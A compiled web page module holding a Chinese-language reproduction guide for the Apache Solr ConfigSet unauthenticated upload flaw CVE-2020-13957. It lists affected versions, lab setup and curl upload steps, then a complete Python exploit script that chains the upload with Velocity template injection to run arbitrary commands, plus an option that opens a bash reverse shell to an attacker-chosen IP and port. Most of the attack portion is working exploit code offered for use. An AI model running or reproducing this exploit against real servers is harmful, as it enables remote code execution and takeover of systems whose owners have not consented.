import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as i,c as l,a as n,b as s,d as e,e as a}from"./app-58e4a7d6.js";const c={},u=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>在特定的Solr版本中ConfigSet API存在未授权上传漏洞，攻击者利用漏洞可实现远程代码执行。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Apache Solr 6.6.0 -6.6.5
Apache Solr 7.0.0 -7.7.3
Apache Solr 8.0.0 -8.6.2
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>选择一个存在漏洞的版本</p>`,6),r={href:"http://archive.apache.org/dist/lucene/solr/",target:"_blank",rel:"noopener noreferrer"},d=a(`<p>这里复现使用的是 Apache Solr 7.7.0 进行复现</p><p>下载后执行以下命令进行环境部署</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>cd solr-7.7.0
./bin/solr start -e cloud -force
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>然后一路回车，直至出现</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>Created collection &#39;gettingstarted&#39; with 2 shard(s), 2 replica(s) with config-set &#39;gettingstarted&#39;

Enabling auto soft-commits with maxTime 3 secs using the Config API

POSTing request to Config API: http://localhost:8983/solr/gettingstarted/config
{&quot;set-property&quot;:{&quot;updateHandler.autoSoftCommit.maxTime&quot;:&quot;3000&quot;}}
Successfully set-property updateHandler.autoSoftCommit.maxTime to 3000


SolrCloud example running, please visit: http://localhost:8983/solr
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,5),k={href:"http://xxx.xxx.xxx.xxx:8983/solr/",target:"_blank",rel:"noopener noreferrer"},m=a(`<h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>在攻击机上下载目标版本的Solr,执行下列命令打包压缩文件</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>solr-7.7.0/server/solr/configsets/sample_techproducts_configs/conf
zip -r - * &gt; vuln.zip
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091206515.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>将 vuln.zip 进行上传</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>curl -X POST --header &quot;Content-Type:application/octet-stream&quot; --data-binary @vuln.zip &quot;http://xxx.xxx.xxx.xxx:8983/solr/admin/configs?action=UPLOAD&amp;name=vuln&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>n****ame参数为压缩包的文件名</strong></p><p>利用漏洞创建一个 core</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">curl</span> <span class="token string">&quot;http://xxx.xxx.xxx.xxx:8983/solr/admin/collections?action=CREATE&amp;name=peiqi&amp;numShards=1&amp;replicationFactor=1&amp;wt=xml&amp;collection.configName=vuln&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li>name参数为创建的core核心名</li><li>collection.configName参数为上传的文件名</li></ul><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091207778.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>查看core列表，发现已经成功创建</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091207131.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>再使用 Apache Solr Velocity模板远程执行 CVE-2019-17558 即可执行任意命令</p><ul><li>POC使用详情参考另一篇复现文章</li></ul><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091207833.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><ul><li>使用前按复现步骤上传对应版本的zip文件，例如我这里上传的文件为 qwert.zip,其他使用方法与 Apache Solr Velocity模板远程执行 CVE-2019-17558 的POC使用方法类似</li></ul><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/python3</span>
<span class="token comment">#-*- coding:utf-8 -*-</span>
<span class="token comment"># author : PeiQi</span>
<span class="token comment"># from   : http://wiki.peiqi.tech</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> re
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> os
<span class="token keyword">import</span> json

<span class="token keyword">def</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+------------------------------------------&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mPOC_Des: http://wiki.peiqi.tech                                   \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mGithub : https://github.com/PeiQi0                                 \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34m公众号 : PeiQi文库                                                     \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mVersion: Apache Solr 6.6.0 -6.6.5        \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34m         Apache Solr 7.0.0 -7.7.3        \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34m         Apache Solr 8.0.0 -8.6.2        \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36m使用格式: python3 cve-2020-13957.py       \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36mUrl    &gt;&gt;&gt; http://xxx.xxx.xxx.xxx:8983   \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36mZip    &gt;&gt;&gt; vuln.zip(Zip文件名)            \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+------------------------------------------&#39;</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">POC_1</span><span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> file_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    core_name <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[35mPlease input Create Core Name\\nCore &gt;&gt;&gt; \\033[0m&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    core_update <span class="token operator">=</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;%s/solr/admin/collections?action=CREATE&amp;name=%s&amp;numShards=1&amp;replicationFactor=1&amp;wt=xml&amp;collection.configName=%s&quot;&quot;&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> core_name<span class="token punctuation">,</span> file_name<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&quot;.zip&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span>
    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>core_update<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 创建Core失败 \\033[0m&quot;</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        core <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r&#39;&lt;str name=&quot;core&quot;&gt;(.*?)&lt;/str&gt;&#39;</span><span class="token punctuation">,</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        vuln_url <span class="token operator">=</span> target_url <span class="token operator">+</span> <span class="token string">&quot;/solr/&quot;</span> <span class="token operator">+</span> core <span class="token operator">+</span> <span class="token string">&quot;/config&quot;</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 成功获得core_name,Url为：&quot;</span> <span class="token operator">+</span> target_url <span class="token operator">+</span> <span class="token string">&quot;/solr/&quot;</span> <span class="token operator">+</span> core <span class="token operator">+</span> <span class="token string">&quot;/config\\033[0m&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> vuln_url<span class="token punctuation">,</span>core

<span class="token keyword">def</span> <span class="token function">POC_2</span><span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> core<span class="token punctuation">)</span><span class="token punctuation">:</span>
    open_params <span class="token operator">=</span> target_url <span class="token operator">+</span> <span class="token string">&quot;/solr/&quot;</span> <span class="token operator">+</span> core <span class="token operator">+</span> <span class="token string">&quot;/config&quot;</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;Content-Type&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;application/json&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>
    <span class="token punctuation">}</span>
    set_api_data <span class="token operator">=</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;
    {
      &quot;update-queryresponsewriter&quot;: {
        &quot;startup&quot;: &quot;lazy&quot;,
        &quot;name&quot;: &quot;velocity&quot;,
        &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,
        &quot;template.base.dir&quot;: &quot;&quot;,
        &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,
        &quot;params.resource.loader.enabled&quot;: &quot;true&quot;
      }
    }
    &quot;&quot;&quot;</span>
    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">&quot;POST&quot;</span><span class="token punctuation">,</span> url<span class="token operator">=</span>open_params<span class="token punctuation">,</span> data<span class="token operator">=</span>set_api_data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] POST请求成功将params.resource.loader.enabled设置为True \\033[0m&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] POST请求params.resource.loader.enabled设置为True失败 \\033[0m&quot;</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">POC_3</span><span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> core<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
    vuln_url <span class="token operator">=</span> target_url <span class="token operator">+</span> <span class="token string">&quot;/solr/&quot;</span> <span class="token operator">+</span> core <span class="token operator">+</span> <span class="token string">&quot;/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27&quot;</span> <span class="token operator">+</span> cmd <span class="token operator">+</span> <span class="token string">&quot;%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end&quot;</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;Content-Type&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;application/json&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>
    <span class="token punctuation">}</span>
    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">&quot;GET&quot;</span><span class="token punctuation">,</span> url<span class="token operator">=</span>vuln_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">&quot;Error 500&quot;</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 代码执行失败，响应为 Error 500 \\033[0m&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 漏洞成功利用,响应为\\n \\033[0m&quot;</span><span class="token punctuation">,</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">POC_4</span><span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> core<span class="token punctuation">,</span> IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># POC : /bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/xxx.xxx.xxx.xxx:9999 0&gt;&amp;1</span>
    cmd <span class="token operator">=</span> <span class="token string">&quot;%2Fbin%2Fbash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span>
    vnul_url <span class="token operator">=</span> target_url <span class="token operator">+</span> <span class="token string">&quot;/solr/&quot;</span> <span class="token operator">+</span> core <span class="token operator">+</span> <span class="token string">&quot;/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27&quot;</span> <span class="token operator">+</span> cmd <span class="token operator">+</span> <span class="token string">&quot;%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end&quot;</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;Content-Type&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;application/json&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>
    <span class="token punctuation">}</span>
    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">&quot;GET&quot;</span><span class="token punctuation">,</span> url<span class="token operator">=</span>vnul_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    title<span class="token punctuation">(</span><span class="token punctuation">)</span>
    target_url <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[35mPlease input Attack Url\\nUrl &gt;&gt;&gt; \\033[0m&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    file_name <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[35mPlease input File Name\\nZip &gt;&gt;&gt; \\033[0m&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    vuln_url<span class="token punctuation">,</span>core <span class="token operator">=</span> POC_1<span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> file_name<span class="token punctuation">)</span>
    POC_2<span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> core<span class="token punctuation">)</span>

    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        cmd <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[35mCmd &gt;&gt;&gt; \\033[0m&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> cmd <span class="token operator">==</span> <span class="token string">&quot;exit&quot;</span><span class="token punctuation">:</span>
            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> cmd <span class="token operator">==</span> <span class="token string">&quot;shell&quot;</span><span class="token punctuation">:</span>
            IP   <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[35m请输入监听IP   &gt;&gt;&gt; \\033[0m&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            PORT <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[35m请输入监听PORT &gt;&gt;&gt; \\033[0m&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            POC_4<span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> core<span class="token punctuation">,</span> IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            POC_3<span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> core<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091208112.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,20);function v(g,b){const t=o("ExternalLinkIcon");return i(),l("div",null,[u,n("p",null,[n("a",r,[s("下载各版本Solr地址"),e(t)])]),d,n("p",null,[s("访问 "),n("a",k,[s("http://xxx.xxx.xxx.xxx:8983/solr/"),e(t)]),s(" 正常即可")]),m])}const x=p(c,[["render",v],["__file","Apache Solr RCE 未授权上传漏洞 CVE-2020-13957.html.vue"]]);export{x as default};
